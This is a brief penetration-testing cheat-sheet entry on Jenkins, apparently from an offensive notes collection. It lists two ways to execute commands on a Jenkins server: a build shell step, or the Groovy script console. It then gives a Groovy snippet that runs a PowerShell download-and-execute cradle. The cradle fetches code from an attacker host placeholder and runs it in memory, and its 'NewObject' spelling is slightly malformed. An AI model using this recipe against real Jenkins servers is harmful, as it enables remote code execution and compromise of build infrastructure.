# Jenkins

> Jenkins is a free and open source automation server. Jenkins helps to automate the non-human part of the software development process, with continuous integration and facilitating technical aspects of continuous delivery. It is a server-based system that runs in servlet containers such as Apache Tomcat.  
>
> -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/Jenkins_(software))</cite>

## Command execution

1. Create new project  
2. Build -> execute shell  

or

1. Manage jenkins  
2. Script console  

```groovy
cmd = """ powershell "IEX(NewObject Net.WebClient).downloadString('http://<ip>/file')" """
println cmd.execute().text
```
